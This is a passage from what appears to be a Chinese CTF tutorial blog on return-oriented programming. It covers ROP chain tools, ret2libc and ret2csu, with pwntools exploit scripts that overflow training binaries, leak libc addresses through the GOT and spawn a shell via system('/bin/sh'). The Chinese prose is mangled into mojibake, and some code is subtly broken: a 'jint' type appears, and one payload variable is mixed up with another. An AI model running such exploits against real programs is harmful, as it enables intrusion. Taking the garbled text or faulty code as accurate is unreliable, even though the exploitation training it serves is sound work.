0x80å°±å¯ä»¥æ‰§è¡Œç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>é‚£è¯¥æ€ä¹ˆæ§åˆ¶å‘¢ï¼ŸğŸ¤¨ <del>æŠŠåˆ€æ¶åœ¨å¯„å­˜å™¨è„–å­ä¸Š</del></p><p>æˆ‘ä»¬ä»¬å¯ä»¥ä½¿ç”¨popå’ŒretæŒ‡ä»¤ç»„åˆæ¥æ§åˆ¶å¯„å­˜å™¨çš„å€¼ä»¥åŠæ‰§è¡Œæ–¹å‘ã€‚</p><h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><p>ROPgadgetå’Œropperï¼Œä¸¤ä¸ªéƒ½å¯å¯ä»¥æ‰¾ï¼Œç›®æ ‡æ±‡ç¼–ä»£ç ç‰‡æ®µï¼ŒROPgadgeté€Ÿåº¦æ›´å¿«ä½†æ˜¯æŸ¥æ‰¾ç»“æœå¹¶ä¸å®Œæ•´ï¼›ropperé€Ÿåº¦ç›¸å¯¹è¾ƒæ…¢ä½†æŸ¥æ‰¾ç»“æœç²¾å‡†ã€‚</p><p>å¯¹äºé™æ€ç”Ÿæˆçš„ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥ä¸ç”¨æ¯ä¸€æ¬¡éƒ½ä¸€æ¡ä¸€æ¡çš„å»æ‰¾å‘½ä»¤ï¼Œå¯ä»¥ç›´æ¥ç”Ÿæˆä¸€æ¡ROPé“¾</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">ropper</span> <span class="hljs-literal">--</span><span class="hljs-comment">file inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">chain execverropper</span> <span class="hljs-literal">--</span><span class="hljs-comment">file inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">chain execve</span><br><span class="hljs-comment">ROPgadget</span> <span class="hljs-literal">--</span><span class="hljs-comment">binary inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">ropchain</span><br></code></pre></td></tr></table></figure><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>ret2libcå³æ§åˆ¶å‡½æ•°æ‰§è¡Œlibcä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›å€¼æŸä¸ªå‡½æ•°çš„pltå¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½®ï¼ˆå³å‡½æ•°å¯¹åº”çš„gotè¡¨é¡¹çš„å†…å®¹ï¼‰ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ system(â€œ&#x2F;bin&#x2F;shâ€)ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚</p><h4 id="ğŸŒ°-1-2"><a href="#ğŸŒ°-1-2" class="headerlink" title="ğŸŒ°_1:"></a>ğŸŒ°_1:</h4><p>CTF Wiki çš„é¢˜ï¼Œè¶…ç®€å•çš„æ‰€æœ‰ä¿¡æ¯éƒ½ç»™å‡ºçš„æ–°æ‰‹é¢˜ç›® <del>æˆ‘éƒ½ä¼šåš</del></p><p>é¦–å…ˆæŸ¥çœ‹å®‰å…¨ä¿æŠ¤</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-39-30.png"></p><p>æºç¨‹åºä¸º 32 ä½ï¼Œå¼€å¯äº† NX ä¿æŠ¤ã€‚çœ‹ä¸€ä¸‹ç¨‹åºæºä»£ç ï¼Œç¡®å®šæ ˆæº¢å‡ºåˆ©ç”¨ä½ç½®</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-42-44.png"></p><p>getså¯ä»¥æ ˆæº¢å‡ºã€‚</p><p>æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°systemå‡½æ•°å’Œâ€™bin&#x2F;shâ€™å­—ç¬¦ä¸²</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-46-14.png"></p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-48-21.png"></p><p>æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è¿”å› system çš„åœ°å€</p><p>è®¡ç®—åç§»é‡ä¸º112ï¼Œæ„é€ payloadã€‚éœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬è°ƒç”¨systemå‡½æ•°ï¼Œä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„å››å­—èŠ‚çš„è¿”å›åœ°å€ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶å¡«å……åå†é™„ä¸Šæˆ‘ä»¬çš„ â€˜&#x2F;bin&#x2F;shâ€™ å­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process( <span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/Cm8v0D/ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br><br>payload=flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>, binsh_addr])<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="ğŸŒ°-2-2"><a href="#ğŸŒ°-2-2" class="headerlink" title="ğŸŒ°_2:"></a>ğŸŒ°_2:</h4><p>åŒæ ·æ˜¯32ä½çš„ç¨‹åºå¼€å¯NXä¿æŠ¤ï¼Œæœ‰ä¸€ä¸ªgetså¯ä»¥åˆ©ç”¨ã€‚æœ‰systemå‡½æ•°ä½†æ²¡æœ‰ â€˜&#x2F;bin&#x2F;shâ€™ å­—ç¬¦ä¸²ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªgets()å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±è¯»å–ã€‚åŒæ—¶æˆ‘ä»¬åœ¨.bssæ®µå‘ç°ä¸€ä¸ªbufå¯ä»¥ä¼ å‚ï¼Œå¯ä»¥æŠŠå­—ç¬¦ä¸²å¡«åœ¨è¿™é‡Œ</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-44-44.png"></p><p>ç¼–å†™expï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br><br>r=process(&#x27;/var/run/vmblock-fuse/blockdir/wD0Lp7/ret2libc2&#x27;)<br><br>buf_addr = 0x804A080<br>gets_addr = 0x8048460<br>sys_addr = 0x8048490<br><br>payload = flat( [&#x27;A&#x27;*112, gets_addr, sys_addr, buf_addr, buf_addr] )<br>r.sendline(payload)<br>r.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>payloadè§£é‡Šï¼š</p><ul><li><code>&#39;A&#39;*112</code>ï¼šå¡«å……112ä¸ªå­—ç¬¦â€™Aâ€™æº¢å‡ºç¼“å†²åŒºï¼Œè¦†ç›–è¿”å›åœ°å€ã€‚</li><li><code>gets_addr</code>ï¼šå°†<code>gets</code>å‡½æ•°çš„åœ°å€ä½œä¸ºåŸæœ¬ç¨‹åºçš„gets()å‡½æ•°çš„è¿”å›åœ°å€ï¼Œæ§åˆ¶ç¨‹åºæµç¨‹è·³è½¬åˆ°<code>gets</code>å‡½æ•°ã€‚</li><li><code>sys_addr</code>ï¼š<code>system</code>å‡½æ•°çš„åœ°å€ï¼Œå°†ä½œä¸º<code>gets</code>å‡½æ•°è¿”å›åçš„ä¸‹ä¸€ä¸ªåœ°å€ï¼Œæ§åˆ¶ç¨‹åºæµç¨‹è·³è½¬åˆ°<code>system</code>å‡½æ•°ã€‚</li><li><code>buf_addr</code>ï¼šç¼“å†²åŒºçš„åœ°å€ï¼Œä½œä¸º<code>system</code>å‡½æ•°çš„å‚æ•°ï¼Œä¼ é€’ç»™<code>system</code>å‡½æ•°çš„å‘½ä»¤å­—ç¬¦ä¸²æ‰€åœ¨çš„å†…å­˜åœ°å€ã€‚</li><li><code>buf_addr</code>ï¼šå†æ¬¡ä½¿ç”¨ç¼“å†²åŒºçš„åœ°å€ï¼Œä½œä¸º<code>gets</code>å‡½æ•°çš„å‚æ•°ï¼Œä½¿å¾—<code>gets</code>å‡½æ•°å°†ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤å­—ç¬¦ä¸²å†™å…¥åˆ°ç¼“å†²åŒºã€‚</li></ul><h4 id="ğŸŒ°-3"><a href="#ğŸŒ°-3" class="headerlink" title="ğŸŒ°_3:"></a>ğŸŒ°_3:</h4><p>è¿™æ¬¡systemä¹Ÿæ²¡äº†ğŸ¤¨ï¼Œå…¶ä»–çš„ä¿æŠ¤å’Œæ¼æ´éƒ½å’Œä¾‹ä¸€ä¾‹äºŒä¸€æ ·ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œé¢˜ç›®ä¸­åˆç»™äº†ä¸€ä¸ª libc.so åŠ¨æ€é“¾æ¥åº“ã€‚</p><p>é‚£æ€ä¹ˆå¾—åˆ°systemçš„åœ°å€å‘¢ï¼Ÿ</p><p>è¡¥è¯¾æ—¶é—´åˆ°ï¼</p><ul><li>system å‡½æ•°å±äº libcï¼Œè€Œ libc.so åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ã€‚</li><li>å³ä½¿ç¨‹åºæœ‰ ASLR ä¿æŠ¤ï¼Œä¹Ÿåªæ˜¯é’ˆå¯¹äºåœ°å€ä¸­é—´ä½è¿›è¡Œéšæœºï¼Œæœ€ä½çš„ 12 ä½å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚è€Œ libc åœ¨ github ä¸Šæœ‰äººè¿›è¡Œæ”¶é›†ï¼Œ<a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬è¿˜è¦çŸ¥é“ï¼ŒA çœŸå®åœ°å€ (å†…å­˜ç‰©ç†åœ°å€) - A åç§»åœ°å€ &#x3D; B çœŸå®åœ°å€ (å†…å­˜ç‰©ç†åœ°å€) -B åç§»åœ°å€ &#x3D; åŸºåœ°å€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>Bçš„çœŸå®åœ°å€&#x3D;åŸºåœ°å€+Bçš„åç§»åœ°å€</strong>ã€‚</p><p><strong>æ‰€ä»¥å¦‚æœæˆ‘ä»¬çŸ¥é“ libc ä¸­æŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šè¯¥ç¨‹åºåˆ©ç”¨çš„ libcã€‚è¿›è€Œæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚</strong></p><p>é‚£è¯¥å¦‚ä½•è·å¾—å·²çŸ¥å‡½æ•°çš„åœ°å€å‘¢ï¼Ÿ</p><p>gotè¡¨æ³„éœ²ï¼è¾“å‡ºæŸä¸ªå‡½æ•°å¯¹åº”çš„gotè¡¨å†…å®¹ï¼Œæ³¨æ„libcçš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œgotè¡¨ä¸­åªæœ‰å·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°æœ‰çœŸå®åœ°å€ï¼Œæˆ‘ä»¬éœ€è¦æ³„éœ²å·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°åœ°å€ã€‚å†åœ¨ç¨‹åºä¸­æŸ¥è¯¢åç§»è¿›ä¸€æ­¥è·å¾—systemåœ°å€ã€‚</p><p>ä½†æ˜¯ï¼è¿™æ ·å¤ªéº»çƒ¦å•¦æˆ‘ä»¬å¯ä»¥ç”¨å·¥å…·ï¼š<a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a> </p><p>expï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br><br>sh = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>got_puts = elf.got[&#x27;puts&#x27;]<br>got_libc_startmain = elf.got[&#x27;__libc_start_main&#x27;]<br>main = elf.symbols[&#x27;main&#x27;]<br><br>payload1 = flat( [b&#x27;A&#x27;*112, puts_plt, main, got_puts] )<br>sh.sendlineafter(&#x27;!?&#x27;, payload1)<br>puts_addr = u32(sh.recv(4))<br><br><span class="hljs-comment"># libc6_2.27-3ubuntu1.2_i386</span><br>libc_puts = 0x67c10 <span class="hljs-comment">#offset</span><br>libc_system = 0x3d250<br>libc_binsh = 0x17e3cf<br><br>libc_base = puts_addr - libc_puts<br>system_addr = libc_base + libc_system<br>binsh_addr = libc_base + libc_binsh<br><br>payload2 = flat( [b&#x27;A&#x27;*112, system_addr, 0xcafebabe, binsh_addr] )<br>sh.sendlineafter(&#x27;!?&#x27;, payload2)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>äº†è§£ret2csuä¹‹å‰å…ˆäº†è§£ä¸€ä¸‹attached codeçš„æ¦‚å¿µã€‚</p><p>æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸ªç®€å•çš„åªæœ‰ä¸€ä¸ªmainå‡½æ•°çš„ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">include&lt;stdio.h&gt;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(jint argc,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶çš„å‡½æ•°ç¬¦å·ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nm</span> -<span class="hljs-keyword">a</span> [filename] | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;t\|T&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-28_20-37-10.png"></p><p>å¯ä»¥å‘ç°é™¤äº† main å‡½æ•°è¿˜æœ‰å¾ˆå¤šå…¶å®ƒå‡½æ•°ï¼Œè¿™äº›å‡½æ•°æ˜¯ç¼–è¯‘å™¨é™„åŠ åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ï¼Œç§°ä¹‹ä¸º attached code ã€‚è¿™äº› attached code åœ¨main å‡½æ•°ä¹‹å‰æ‰§è¡Œï¼Œè´Ÿè´£åŠ è½½æˆ–è€…é“¾æ¥åº“æ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥ä» attached code ä¸­å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ gadgetsã€‚</p><p>æˆ‘ä»¬åˆ©ç”¨ <code>objdum -D [filename] </code>å‘½ä»¤æŸ¥çœ‹æ–‡ä»¶åæ±‡ç¼–ä»£ç å¯ä»¥çœ‹åˆ° <code>__libc_csu_init()</code> å‡½æ•°ä¸­å­˜åœ¨ä»¥ä¸‹gadgetï¼š</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-28_20-50-34.png"></p><p>åœ¨ 64 ä½ç¨‹åºä¸­ï¼Œå‡½æ•°çš„å‰ 6 ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„ï¼Œå‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨: rdi, rsi, rdx, rcx, r8, r9ã€‚ä½†æ˜¯å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°æ¯ä¸€ä¸ªå¯„å­˜å™¨å¯¹åº”çš„ gadgetsã€‚ è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>__libc_csu_init</code> ä¸­çš„ gadgetsã€‚æˆ‘ä»¬å¯ä»¥åœ¨æ‰§è¡Œå®Œç¬¬äºŒä¸ªgadgetåretåˆ°ç¬¬ä¸€ä¸ªgadgetï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶å¾ˆå¤šå…³é”®å¯„å­˜å™¨çš„å€¼ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æ–¹æ³•ä¸èƒ½æ§åˆ¶raxçš„å€¼ï¼Œä¹Ÿå°±æ— æ³•è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œå› ä¸ºç³»ç»Ÿè°ƒç”¨å·åœ¨raxé‡Œã€‚ä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡writeç­‰å‡½æ•°æ³„éœ²gotè¡¨ä¸­çš„å‡½æ•°åœ°å€ï¼Œç„¶åè®¡ç®—å‡ºlibcåœ°å€ã€‚</p><p>æœ‰ä»¥ä¸‹å‡ ç§åˆ©ç”¨åœºæ™¯ï¼š</p><ul><li>ret2csuæ³„éœ²libcåœ°å€ååˆ©ç”¨libcä¸­çš„gadget</li><li>ret2csué…åˆpop rax;syscall;ç­‰gadgetç›´æ¥getshell</li><li>å¼€å¯pieçš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨offset2libè¿›è¡Œret2csu,æˆ–è€…ç›´æ¥åˆ©ç”¨libcä¸­çš„gadget getshell</li></ul><blockquote><p>offset2libç®€å•æ¥è¯´å°±æ˜¯æ³„éœ²ä»»æ„ä»£ç æ®µåœ°å€å³å¯æ¨å¾—æ‰€æœ‰å…±äº«åº“åœ°å€,å› ä¸ºå…±äº«åº“ä¹‹é—´çš„offsetæ˜¯å›ºå®šçš„.</p></blockquote><h4 id="ğŸŒ°-1-3"><a href="#ğŸŒ°-1-3" class="headerlink" title="ğŸŒ°_1:"></a>ğŸŒ°_1:</h4><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5%E3%80%82">https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5ã€‚</a></p><p>é¢˜ç›®æ²¡æœ‰å¼€å¯pieå’Œcanaryä¿æŠ¤ã€‚</p><p>è’¸ç±³å¸ˆå‚…ç»™äº†æºç ï¼Œæˆ‘ä»¬è‡ªå·±æ‹–åˆ° ida é‡Œä¹Ÿèƒ½åˆ¤æ–­å‡ºä»£ç çš„åŸºæœ¬é€»è¾‘ï¼Œmain() å‡½æ•°é‡Œè¿˜æœ‰ä¸€ä¸ª <code>vulnerable_function()</code> å‡½æ•° ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>];<br>read(STDIN_FILENO, buf, <span class="hljs-number">512</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>write(STDOUT_FILENO, <span class="hljs-string">&quot;Hello, World/n&quot;</span>, <span class="hljs-number">13</span>);<br>vulnerable_function();<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨readå¤„æœ‰æ˜æ˜¾çš„æ ˆæº¢å‡ºå¯ä»¥åˆ©ç”¨ã€‚<code>.plt</code> è¡¨é‡Œå°±åªæœ‰writeå‡½æ•°å’Œreadå‡½æ•°ã€‚</p><p>æˆ‘ä»¬çš„ç›®çš„æ˜¯è°ƒç”¨ <code>system(&quot;/bin/sh&quot;)</code> ï¼Œå¯ä»¥å…ˆæ³„éœ²å‡ºlibcå‡½æ•°çš„åœ°å€ï¼Œç”¨writeæ‰“å°å‡ºæ¥ï¼Œé€šè¿‡è®¡ç®—åç§»å°±å¯ä»¥æ±‚å‡ºsystemå‡½æ•°çš„åœ°å€ã€‚ç„¶åä½¿ç”¨readå‡½æ•°å°†çœŸå®çš„systemå‡½æ•°åœ°å€å’Œ&#x2F;bin&#x2F;shå­—ç¬¦ä¸²å†™å…¥bssæ®µï¼Œæœ€åè°ƒç”¨systemå‡½æ•°å³å¯ã€‚</p><p>æˆ‘ä»¬çŸ¥é“åœ¨64ä½çš„ç¨‹åºä¸­ï¼Œå‰å…­ä¸ªå‚æ•°ä½¿ç”¨å¯„å­˜å™¨RDI, RSI, RDX, RCX, R8å’Œ R9ä¼ é€’</p><p>åœ¨__libc_csu_init()å‡½æ•°ä¸­æœ‰å¯ä»¥åˆ©ç”¨çš„gadgets</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-06-19_10-16-23.png"></p><p>æˆ‘ä»¬æ§åˆ¶rbx,rbp,r12,r13,r14å’Œr15çš„å€¼ï¼Œå†å°†r15çš„å€¼èµ‹å€¼ç»™rdxï¼Œr14çš„å€¼èµ‹å€¼ç»™rsiï¼Œr15çš„å€¼èµ‹å€¼ç»™ediã€‚ç®€å•æ¥è¯´å¯¹åº”å…³ç³»å°±æ˜¯:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">rdi</span>=  <span class="hljs-built_in">edi</span> = <span class="hljs-built_in">r13</span>,  <span class="hljs-built_in">rsi</span> = <span class="hljs-built_in">r14</span>, <span class="hljs-built_in">rdx</span> = <span class="hljs-built_in">r15</span><br></code></pre></td></tr></table></figure><p>éšåå°±ä¼šè°ƒç”¨ <code>call qword ptr [r12+rbx*8]</code> ã€‚è¿™æ¡æŒ‡ä»¤çš„å«ä¹‰æ˜¯å‘ <code>[r12+rbx*8]</code> é—´æ¥å¯»å€ï¼Œè·³è½¬åˆ°æ‰€æŒ‡çš„å‡½æ•°åœ°å€ã€‚æˆ‘ä»¬å°±å¯ä»¥å°†rbxèµ‹å€¼ä¸º0ï¼Œè¿™æ ·çš„å¯»å€ç»“æœå°±æ˜¯r12æ‰€æŒ‡å‘çš„åœ°å€ã€‚</p><p>æ¥ä¸‹æ¥çš„æ±‡ç¼–ä»£ç ç‰‡æ®µå«ä¹‰ä¸ºï¼šæ‰§è¡ŒcallæŒ‡ä»¤ç»“æŸåï¼Œç¨‹åºå¯¹rbxåŠ ä¸€ï¼Œç„¶åå¯¹æ¯”rbxå’Œrbpçš„å€¼ï¼Œå¦‚æœç›¸ç­‰å°±ä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚ä¸ºäº†è®©rbxå’Œrbpç›¸ç­‰ï¼Œæˆ‘ä»¬éœ€è¦å°†rbpèµ‹å€¼ä¸º1ã€‚</p><ul><li>payload-1</li></ul><p>åˆ©ç”¨ <code>read()</code> è¯»å…¥æˆ‘ä»¬çš„payloadï¼Œ<code>write()</code> è¾“å‡ºå…¶gotè¡¨ä¸­çš„åœ°å€ã€‚é™¤äº†æ³„éœ²åœ°å€ï¼Œä¸ºäº†è¿”å›åˆ°åŸç¨‹åºä¸­é‡å¤åˆ©ç”¨ <code>buffer overflow</code> çš„æ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦ç»§ç»­è¦†ç›–æ ˆä¸Šçš„æ•°æ®ï¼Œç›´åˆ°æŠŠè¿”å›å€¼è¦†ç›–æˆç›®æ ‡å‡½æ•°çš„mainå‡½æ•°ä¸ºæ­¢ã€‚</p><p>æ€»ç»“ä¸€ä¸‹æˆ‘ä»¬è¦å®ç°çš„payloadéœ€æ±‚ï¼š<code>rbx=0,rbp=1,r12=write_address,rdi=edi=r13,rsi=r14,rdx=r15</code>ï¼Œ<code>write(1,write_got,8)</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">csu_end</span> = <span class="hljs-number">0</span><span class="hljs-variable">x400606</span><br><span class="hljs-variable">csu_front</span> = <span class="hljs-number">0</span><span class="hljs-variable">x4005F0</span><br><span class="hljs-variable">got_write</span> = <span class="hljs-variable">level5.got</span>[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-variable">main_address</span> = <span class="hljs-number">0</span><span class="hljs-variable">x400564</span><br><br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">got_write</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">8</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">got_write</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>write(1,write_got,8) çš„å«ä¹‰ä¸ºå°† writ å‡½æ•°çš„åœ°å€å†™å…¥æ ‡å‡†è¾“å‡ºæµä¸­ï¼Œå†™å…¥çš„å­—èŠ‚æ•°ä¸º 8</p></blockquote><p>åœ¨æ”¶åˆ°write()åœ¨å†…å­˜ä¸­çš„åœ°å€åï¼Œå°±å¯ä»¥è®¡ç®—å‡ºsystem()åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚å€Ÿæ­¤å°±å¯ä»¥å°†execveçš„åœ°å€ä»¥åŠâ€œ&#x2F;bin&#x2F;shâ€è¯»å…¥åˆ°.bssæ®µå†…å­˜ä¸­ã€‚</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 